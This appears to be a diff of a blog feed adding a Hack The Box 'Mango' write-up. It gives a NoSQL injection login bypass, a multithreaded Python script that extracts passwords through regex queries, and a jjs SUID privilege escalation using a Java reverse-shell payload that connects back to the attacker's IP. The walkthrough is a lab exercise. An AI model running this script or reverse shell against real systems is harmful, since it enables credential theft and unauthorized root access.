@@ -1,4 +1,354 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-12T00:05:29+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Windows - Hard] - Tally</title><link href="http://localhost:4000/2022/08/31/Tally.html" rel="alternate" type="text/html" title="HTB Writeup [Windows - Hard] - Tally" /><published>2022-08-31T00:00:00+02:00</published><updated>2022-08-31T00:00:00+02:00</updated><id>http://localhost:4000/2022/08/31/Tally</id><content type="html" xml:base="http://localhost:4000/2022/08/31/Tally.html"><![CDATA[<p><img src="/assets/Tally/Tally.png" alt="" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-14T13:02:59+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">OmniSl4sh’s Blog</title><entry><title type="html">HTB Writeup [Linux - Medium] - Mango</title><link href="http://localhost:4000/2022/10/11/Mango.html" rel="alternate" type="text/html" title="HTB Writeup [Linux - Medium] - Mango" /><published>2022-10-11T00:00:00+02:00</published><updated>2022-10-11T00:00:00+02:00</updated><id>http://localhost:4000/2022/10/11/Mango</id><content type="html" xml:base="http://localhost:4000/2022/10/11/Mango.html"><![CDATA[<p><img src="/assets/Mango/Mango.png" alt="" /></p>
+
+<h2 id="summary">Summary</h2>
+<ul>
+  <li><strong>Mango</strong> is a <strong>Linux box</strong> where both <strong>HTTP and HTTPS websites</strong> are hosted.</li>
+  <li><em>While inspecting the site’s</em> <strong><em>SSL certificate</em></strong>, we notice another <strong>virtual host.</strong></li>
+  <li>That <strong>vhost</strong> had a <strong>login page</strong> on HTTP which happened to <strong>vulnerable to NoSQL injection.</strong></li>
+  <li><em>After logging in with an</em> <strong><em>Authentication Bypass,</em></strong> we found the site <strong><em>still under construction.</em></strong></li>
+  <li><em>Without any functionality to abuse,</em> we turned to <strong>NoSQL’s built-in regex capability</strong> to <strong>enumerate the usernames and passwords</strong> on the web app <strong><em>in hopes of reusing them with SSH.</em></strong></li>
+  <li><em>Since</em> <strong><em>retrieving passwords manually</em></strong> <em>was time consuming,</em> we <strong>wrote a Python script</strong> to <strong>automate the process</strong> and <strong>further developed it</strong> for <strong>multi-threading support</strong> <strong><em>(it ran 9X faster.)</em></strong></li>
+  <li>We were able to get <strong>credentials for two usernames</strong>: <code class="language-plaintext highlighter-rouge">admin</code> and <code class="language-plaintext highlighter-rouge">mango</code>. The <code class="language-plaintext highlighter-rouge">mango</code> user had <strong>SSH access</strong> which we leveraged to access the box.</li>
+  <li><em>From inside,</em> we could <strong>pivot</strong> to the <code class="language-plaintext highlighter-rouge">admin</code> user using <code class="language-plaintext highlighter-rouge">su</code> because <strong><em>had the same password.</em></strong></li>
+  <li><em>While trying to</em> <strong><em>escalate our privileges</em></strong>, we found an <strong>SUID binary</strong> called <code class="language-plaintext highlighter-rouge">jjs</code> which we <strong>exploited</strong> with the help of <a href="https://gtfobins.github.io/">GTFOBins</a> <em>-and some minor tweaks-</em> to become <code class="language-plaintext highlighter-rouge">root</code>.</li>
+</ul>
+
+<hr />
+
+<h2 id="nmap">NMAP</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
+|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
+|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
+80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: 403 Forbidden
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: Mango | Search Base
+| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
+| Not valid before: 2019-09-27T14:21:19
+|_Not valid after:  2020-09-26T14:21:19
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+</code></pre></div></div>
+<p><em>From the</em> <code class="language-plaintext highlighter-rouge">nmap</code> <em>port scan,</em> we see <strong>SSH, HTTP &amp; HTTPS</strong> ports open.</p>
+
+<p>But we also notice that the <code class="language-plaintext highlighter-rouge">ssl-cert</code> script shows a <strong>virtual host</strong>: <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code></p>
+
+<h2 id="checking-the-websites">Checking the Websites</h2>
+<p><em>To handle</em> <strong><em>Virtual Host Routing,</em></strong> We <strong>add an entry</strong> in our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file for both the <strong>TLD</strong> <code class="language-plaintext highlighter-rouge">mango.htb</code> and the <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> <strong>subdomain</strong>.</p>
+
+<p><img src="/assets/Mango/etc-hosts.jpg" alt="" /></p>
+
+<p>visting <code class="language-plaintext highlighter-rouge">mango.htb</code> only gets us a <strong>valid page</strong> on the <strong>HTTPS site</strong>. The <strong>HTTP</strong> one gives back a <strong>403 forbidden response</strong> <em>as we’ve seen from</em> <code class="language-plaintext highlighter-rouge">nmap</code><em>’s output.</em></p>
+
+<p><img src="/assets/Mango/mango-htb-sites.jpg" alt="" /></p>
+
+<p>The <strong>search function</strong> suggests testing for <strong>SQL Injection</strong>. <em>To do so,</em> we <strong>intercept the request</strong> and <strong>save it to a file.</strong></p>
+
+<p><img src="/assets/Mango/search-sqli-request.jpg" alt="" /></p>
+
+<p>then pass it to <code class="language-plaintext highlighter-rouge">sqlmap</code> using the <code class="language-plaintext highlighter-rouge">-r</code> flag as well as the <code class="language-plaintext highlighter-rouge">--force-ssl</code> flag to <strong>target HTTPS.</strong></p>
+
+<p><img src="/assets/Mango/sqlmap-search.jpg" alt="" /></p>
+
+<p>Doing this <strong><em>doesn’t yield back any results :/</em></strong></p>
+
+<p><em>Afterward,</em> we attempted to <strong>abuse any of the available functions</strong> in the <code class="language-plaintext highlighter-rouge">analytics.php</code> page. (<strong><em>like checking for SSRF</em></strong>)</p>
+
+<p><img src="/assets/Mango/analytics-page-testing.jpg" alt="" /></p>
+
+<p><em>but without no luck there as well.</em></p>
+
+<p><em>Moving on, we look at the</em> <strong>HTTP version</strong> <em>of the</em> <code class="language-plaintext highlighter-rouge">staging-order.mango.htb</code> <em>virtual host,</em> we found a <strong>login page.</strong></p>
+
+<p><img src="/assets/Mango/http-subdomain.jpg" alt="" /></p>
+
+<p><em>After intercepting the request,</em> we attempted injecting <strong>common SQL Injection payloads</strong> but they <em>didn’t work.</em></p>
+
+<p><em>So intead,</em> we tried <strong>NoSQL methods for bypassing authentication</strong> like using the not equal (<code class="language-plaintext highlighter-rouge">$ne</code>) directive.</p>
+
+<p><em>By setting</em> <strong><em>both the username and password</em></strong> <em>to</em> <strong><em>values we’re sure don’t exist in the database</em></strong> <em>(ex: test/test),</em> the check <strong>should evaluate to</strong> <code class="language-plaintext highlighter-rouge">true</code> and let us log in.</p>
+
+<p><img src="/assets/Mango/nosqli-auth-bypass.jpg" alt="" /></p>
+
+<p><strong>It worked!</strong> and we got a <strong>302 response.</strong> we <strong>followed the redirection</strong> to get this page:</p>
+
+<p><img src="/assets/Mango/login-success-page.jpg" alt="" /></p>
+
+<p>we get a <strong>potential username</strong> here: <code class="language-plaintext highlighter-rouge">admin</code></p>
+
+<p><em>other than that,</em> there was <strong>nothing here to played with.</strong></p>
+
+<h2 id="exploiting-nosql-injection-to-get-credentials">Exploiting NoSQL Injection to Get Credentials</h2>
+
+<p><strong><em>Still,</em></strong> having a <strong>NoSQL Injection</strong> means we can <strong><em>abuse</em></strong> the <code class="language-plaintext highlighter-rouge">$regex</code> directive to <strong>enumerate any usernames/passwords.</strong></p>
+
+<p>Our plan here is to <strong>obtain creds</strong> and <strong>try them with SSH</strong> to <strong>exploit any reuse.</strong></p>
+
+<p><em>To check the</em> <strong><em>first character</em></strong> <em>of the</em> <code class="language-plaintext highlighter-rouge">admin</code> <em>user’s password,</em> we can <strong>supply a regular expression</strong> like below:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin&amp;password[$regex]=^a
+</code></pre></div></div>
+
+<p>The above regex would <strong><em>be evaluated</em></strong> to see if the <strong>password starts</strong> with the letter “a” or not.</p>
+
+<ul>
+  <li><strong><em>if the pattern matches,</em></strong> we would get the <strong>302 redirect</strong> and <strong>get authenticated.</strong></li>
+  <li><strong><em>if not,</em></strong> we should get a <strong><em>different response.</em></strong></li>
+</ul>
+
+<p>Let’s <strong>give it a try</strong> using <strong>Burp</strong></p>
+
+<p><img src="/assets/Mango/nosql-enum-incorrect-first-letter.jpg" alt="" /></p>
+
+<p>we get a <strong>200 OK</strong>. this means that <strong>the password doesn’t start with the letter “a”.</strong></p>
+
+<p><strong><em>But, when trying different letters…</em></strong></p>
+
+<p><img src="/assets/Mango/nosql-enum-correct-first-letter.jpg" alt="" /></p>
+
+<p>the response is a <strong>302 redirect</strong> when we <strong>put the first letter as “t”</strong>. which means it’s <strong>the first character</strong> of the <code class="language-plaintext highlighter-rouge">admin</code> user’s password.</p>
+
+<p>Doing this process <strong><em>manually</em></strong> can take a lot of time. That’s <strong>especially true with passwords</strong> since we have to <strong>test all uppercase/lowercase letters in addition to all digits and symbols.</strong></p>
+
+<p><em>That’s why,</em> we <strong>wrote a Python script</strong> to <strong><em>automate the process</em></strong> and <strong><em>even used multi-threading</em></strong> to <strong>make it go faster</strong>.</p>
+
+<p><strong>Note:</strong></p>
+<ul>
+  <li><em>For brevity,</em> the code below is <strong>mainly for obtaining passwords</strong>. But the <strong><em>same concept applies to enumerating usernames (the code for that is commented out).</em></strong></li>
+  <li>I <strong>put comments</strong> to <strong>explain the script</strong> at every point. you’re <strong>advised to read those</strong> to <strong>figure out the logic.</strong></li>
+  <li><em>Lastly,</em> I <strong>divided the script</strong> into <strong>three parts</strong> to <strong>make it easier to grasp.</strong></li>
+</ul>
+
+<h3 id="the-1st-part-importing-the-required-libraries-and-the-test-function">The 1st Part: Importing the required libraries and the “test” function</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">threading</span> <span class="kn">import</span> <span class="n">Thread</span>
+<span class="kn">import</span> <span class="nn">string</span> <span class="c1"># includes the needed character sets
+</span><span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="c1"># a function that takes in a character as input and tests if the password starts with it or not
+</span><span class="k">def</span> <span class="nf">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
+	<span class="c1"># the password variable is defined globally to be accessible everywhere and to be populated
+</span>	<span class="k">global</span> <span class="n">password</span>
+	<span class="c1"># the regex payload, notice that we keep appending the character in question to the end of the already discovered part of the password
+</span>	<span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"^</span><span class="si">{</span><span class="n">password</span><span class="si">}{</span><span class="n">character</span><span class="si">}</span><span class="s">"</span>
+	<span class="n">url</span> <span class="o">=</span> <span class="s">'http://staging-order.mango.htb/'</span>
+	<span class="c1"># filling out the post data with the supplied username and character
+</span>	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
+		<span class="s">'username'</span><span class="p">:</span> <span class="n">username</span><span class="p">,</span>
+		<span class="s">'password[$regex]'</span><span class="p">:</span> <span class="n">payload</span><span class="p">,</span>
+		<span class="s">'login'</span><span class="p">:</span> <span class="s">'login'</span>
+	<span class="p">}</span>
+	<span class="s">"""
+	# here's the post data if you want to enumerate usernames
+	data = {
+		'username[$regex]': payload,
+		'password[$ne]': '',
+		'login': 'login'
+	}
+	"""</span>
+	<span class="c1"># special print function for a cool effect
+</span>	<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="s">"[*] the password for "</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">" is... "</span> <span class="o">+</span> <span class="n">password</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">character</span><span class="p">),</span> <span class="n">flush</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">''</span><span class="p">)</span>
+	<span class="c1"># sending the request without following redirects
+</span>	<span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span> <span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+	<span class="c1"># return true if the status code is the 302 redirection
+</span>	<span class="k">if</span> <span class="n">response</span><span class="p">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">302</span><span class="p">:</span>
+		<span class="k">return</span> <span class="bp">True</span>
+
+</code></pre></div></div>
+<h3 id="the-2nd-part-creating-the-worker-functions-7-total-to-evenly-distribute-and-iterate-over-all-characters-in-parallel">The 2nd Part: Creating the worker functions (7 total) to evenly distribute and iterate over all characters in parallel</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 1st half of the lowercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_L1</span><span class="p">():</span>
+	<span class="c1"># the catch variable represents a valid character found, this is used for stopping all workers when a match is found instead of continuing to search
+</span>	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">13</span><span class="p">]:</span>
+		<span class="c1"># if the catch variable isn't empty (i.e another worker caught the right character), be a smart worker and stop searching ;]
+</span>		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="c1"># if the test function returns true, set the catch variable and stop searching :D
+</span>		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># 2nd half of the lowercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_L2</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">13</span><span class="p">:</span><span class="mi">26</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># 1st half of the uppercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_U1</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">26</span><span class="p">:</span><span class="mi">39</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>			
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># 2nd half of the uppercase alphabet (13 total)
+</span><span class="k">def</span> <span class="nf">alpha_U2</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">character</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="p">[</span><span class="mi">39</span><span class="p">:</span><span class="mi">53</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>			
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">character</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">character</span>
+			<span class="k">break</span>
+
+<span class="c1"># numbers (10 total)
+</span><span class="k">def</span> <span class="nf">numbers</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">digit</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">digit</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">digit</span>
+			<span class="k">break</span>
+
+<span class="c1"># 1st half of symbols (16 total)
+</span><span class="k">def</span> <span class="nf">symbols_1</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">16</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="c1"># these symbols are escaped because they have connotations in the regular expressions language
+</span>		<span class="k">if</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'^'</span><span class="p">,</span> <span class="s">'.'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">,</span> <span class="s">'+'</span><span class="p">,</span> <span class="s">'?'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">]:</span>
+			<span class="n">symbol</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="si">{</span><span class="n">symbol</span><span class="si">}</span><span class="s">"</span>
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">symbol</span>
+			<span class="k">break</span>
+
+<span class="c1"># 2nd half of symbols (16 total)
+</span><span class="k">def</span> <span class="nf">symbols_2</span><span class="p">():</span>
+	<span class="k">global</span> <span class="n">catch</span>
+	<span class="k">for</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span><span class="p">[</span><span class="mi">16</span><span class="p">:</span><span class="mi">33</span><span class="p">]:</span>
+		<span class="k">if</span> <span class="n">catch</span> <span class="o">!=</span> <span class="s">''</span><span class="p">:</span>
+			<span class="k">return</span>
+		<span class="k">if</span> <span class="n">symbol</span> <span class="ow">in</span> <span class="p">[</span><span class="s">'^'</span><span class="p">,</span> <span class="s">'.'</span><span class="p">,</span> <span class="s">'*'</span><span class="p">,</span> <span class="s">'+'</span><span class="p">,</span> <span class="s">'?'</span><span class="p">,</span> <span class="s">'|'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">'</span><span class="p">]:</span>
+			<span class="n">symbol</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="se">\\</span><span class="si">{</span><span class="n">symbol</span><span class="si">}</span><span class="s">"</span>	
+		<span class="k">if</span> <span class="n">test</span><span class="p">(</span><span class="n">symbol</span><span class="p">,</span> <span class="n">target_user</span><span class="p">):</span>
+			<span class="n">catch</span> <span class="o">=</span> <span class="n">symbol</span>
+			<span class="k">break</span>
+</code></pre></div></div>
+<h3 id="the-3rd-part-starting-the-workers-and-letting-them-retrieve-the-passwords-for-both-usernames">The 3rd Part: Starting the workers and letting them retrieve the passwords for both usernames</h3>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># we target both the admin and the mango users, we enumerated the latter using the alternative code above in the test function
+</span><span class="n">target_users</span> <span class="o">=</span> <span class="p">[</span><span class="s">"admin"</span><span class="p">,</span> <span class="s">"mango"</span><span class="p">]</span>
+
+<span class="c1"># foreach user, start with an empty password/catch variables
+</span><span class="k">for</span> <span class="n">target_user</span> <span class="ow">in</span> <span class="n">target_users</span><span class="p">:</span>
+	<span class="n">password</span> <span class="o">=</span> <span class="s">""</span>
+	<span class="n">catch</span> <span class="o">=</span> <span class="s">""</span>
+
+	<span class="c1"># add each of worker functions to the threads array
+</span>	<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+		<span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_L1</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_L2</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_U1</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">alpha_U2</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>	
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">numbers</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>	
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">symbols_1</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+		<span class="n">t</span> <span class="o">=</span> <span class="n">Thread</span><span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">symbols_2</span><span class="p">)</span>
+		<span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
+
+		<span class="c1"># start the workers
+</span>		<span class="k">for</span> <span class="n">worker</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+			<span class="n">worker</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+
+		<span class="c1"># wait for workers to finish
+</span>		<span class="k">for</span> <span class="n">worker</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+			<span class="n">worker</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
+
+		<span class="c1"># if there was no catch, break because that means we have the complete password
+</span>		<span class="k">if</span> <span class="n">catch</span> <span class="o">==</span> <span class="s">""</span><span class="p">:</span>
+			<span class="k">break</span>
+		<span class="c1"># if there was a catch, append it to the password and clear out the variable
+</span>		<span class="n">password</span> <span class="o">+=</span> <span class="n">catch</span>
+		<span class="n">catch</span> <span class="o">=</span> <span class="s">""</span>
+
+	<span class="c1"># print out the password at the end for each user
+</span>	<span class="k">print</span> <span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span> <span class="o">+</span> <span class="s">"[+] the password for "</span> <span class="o">+</span> <span class="n">target_user</span> <span class="o">+</span> <span class="s">": "</span> <span class="o">+</span> <span class="n">password</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">25</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Here’s <strong><em>what the script looks like during run-time:</em></strong></p>
+
+<p><img src="/assets/Mango/getting-passwords.gif" alt="" /></p>
+
+<p><strong>pretty cool, huh? :]</strong></p>
+
+<p><strong><em>to compare its performance,</em></strong> we prepended the <code class="language-plaintext highlighter-rouge">time</code> command to both scripts.</p>
+
+<p>This version <strong>finished enumerating both passwords</strong> in <strong>1 minute and 5 seconds.</strong></p>
+
+<p><img src="/assets/Mango/time-for-multi-threaded-python-script.jpg" alt="" /></p>
+
+<p>which is a <strong>huge improvement</strong> from the <strong>single-threaded version</strong> which <strong>needed almost 9 minutes!</strong></p>
+
+<p><img src="/assets/Mango/time-for-single-threaded-python-script.jpg" alt="" /></p>
+
+<h2 id="gaining-foothold-and-pivoting">Gaining Foothold and Pivoting</h2>
+<p><em>Moving on,</em> <em>when we tried to log in as</em> <code class="language-plaintext highlighter-rouge">admin</code>, it didn’t work. The <code class="language-plaintext highlighter-rouge">mango</code> user had access though.</p>
+
+<p><img src="/assets/Mango/ssh-as-mango.jpg" alt="" /></p>
+
+<p><em>From inside,</em> we could <strong>pivot</strong> to the <code class="language-plaintext highlighter-rouge">admin</code> user with <code class="language-plaintext highlighter-rouge">su</code> since <strong><em>he was using the same password</em></strong> we found.</p>
+
+<p><img src="/assets/Mango/pivot-to-admin-user.jpg" alt="" /></p>
+
+<h2 id="suid-privilege-escalation">SUID Privilege Escalation</h2>
+
+<p><em>Looking for easy setuid wins,</em> We ran the <code class="language-plaintext highlighter-rouge">find</code> command below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-ls</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>and found a <strong>strange binary</strong> called <code class="language-plaintext highlighter-rouge">jjs</code> with the <strong>SUID bit</strong> set:</p>
+
+<p><img src="/assets/Mango/jjs-suid-found.jpg" alt="" /></p>
+
+<p>We <strong>looked it up</strong> and found the below <strong>description</strong> on <a href="https://docs.oracle.com/en/java/javase/13/docs/specs/man/jjs.html">Oracle Docs</a>. It was <strong>exactly what we needed</strong> <strong><em>*evil smile*</em></strong></p>
+
+<p><img src="/assets/Mango/jjs-command.jpg" alt="" /></p>
+
+<p><em>To check for ways to exploit it,</em> we searched <a href="https://gtfobins.github.io/gtfobins/jjs/">GTFOBins</a> and found the below:</p>
+
+<p><img src="/assets/Mango/jjs-on-gtfo-bins.jpg" alt="" /></p>
+
+<p>Seems <strong>pretty straightforward</strong>. A <strong>standard Java reverse shell payload</strong>.</p>
+
+<p><strong>An Important Note:</strong> <em>to</em> <strong><em>inherit the permissions</em></strong> <em>from the</em> <code class="language-plaintext highlighter-rouge">jjs</code> <em>binary and</em> <strong><em>get code execution as</em></strong> <code class="language-plaintext highlighter-rouge">root</code>, we have to <strong>modify the payload</strong> on the <strong>6th line</strong> and call <code class="language-plaintext highlighter-rouge">bash</code> with the <code class="language-plaintext highlighter-rouge">-p</code> flag instead.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">export </span><span class="nv">RHOST</span><span class="o">=</span>10.10.16.9
+<span class="nb">export </span><span class="nv">RPORT</span><span class="o">=</span>9000
+<span class="nb">echo</span> <span class="s1">'var host=Java.type("java.lang.System").getenv("RHOST");
+var port=Java.type("java.lang.System").getenv("RPORT");
+var ProcessBuilder = Java.type("java.lang.ProcessBuilder");
+var p=new ProcessBuilder("/bin/bash", "-p").redirectErrorStream(true).start();
+var Socket = Java.type("java.net.Socket");
+var s=new Socket(host,port);
+var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()&gt;0)so.write(pi.read()); while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read()); so.flush();po.flush(); Java.type("java.lang.Thread").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'</span> | /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+</code></pre></div></div>
+
+<p>we start our <code class="language-plaintext highlighter-rouge">ncat</code> listener and <strong>set the required environment variables</strong> over on the victim machine before <strong>executing the shell.</strong></p>
+
+<p><img src="/assets/Mango/rooted.jpg" alt="" /></p>
+
